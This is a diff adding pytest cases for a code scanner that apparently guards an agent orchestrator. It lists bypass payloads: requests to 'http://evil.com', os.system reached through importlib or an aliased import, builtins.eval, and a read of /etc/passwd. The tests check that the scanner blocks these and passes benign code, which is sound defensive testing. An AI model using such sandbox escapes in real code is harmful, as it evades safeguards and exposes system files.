@@ -58,3 +58,35 @@ def test_orchestrator_rejects_dangerous_input_before_any_agent_call():
     assert result["rejected_at_input"] is True
     assert result["verified"] is False
     assert len(result["security_violations"]) > 0
+
+import pytest
+
+BYPASS_PAYLOADS = {
+    "urllib_network": "import urllib.request\nurllib.request.urlopen('http://evil.com')",
+    "requests_network": "import requests\nrequests.get('http://evil.com')",
+    "importlib_indirection": "import importlib\nimportlib.import_module('os').system('x')",
+    "builtins_eval": "import builtins\nbuiltins.eval('1+1')",
+    "pathlib_read": "import pathlib\nprint(pathlib.Path('/etc/passwd').read_text())",
+    "getattr_gadget": "f = getattr(str, 'upper')",
+    "from_import_escape": "from importlib import import_module",
+    "aliased_os": "import os as o\no.system('x')",
+}
+
+LEGITIMATE_OPTIMIZATIONS = {
+    "nested_loop": "SCALE = 100\nt = 0\nfor i in range(SCALE):\n    t += i\nprint(t)",
+    "hashmap": "from collections import defaultdict\nd = defaultdict(int)\nprint(len(d))",
+    "math_and_itertools": "import math, itertools, heapq, functools\nprint(math.isqrt(16))",
+}
+
+
+@pytest.mark.parametrize("name,source", sorted(BYPASS_PAYLOADS.items()))
+def test_scanner_blocks_known_bypass(name, source):
+    result = scan_code(source)
+    assert result.safe is False, f"{name} was not blocked"
+    assert result.violations
+
+
+@pytest.mark.parametrize("name,source", sorted(LEGITIMATE_OPTIMIZATIONS.items()))
+def test_scanner_allows_legitimate_optimization(name, source):
+    result = scan_code(source)
+    assert result.safe is True, f"{name} was falsely rejected: {result.violations}"
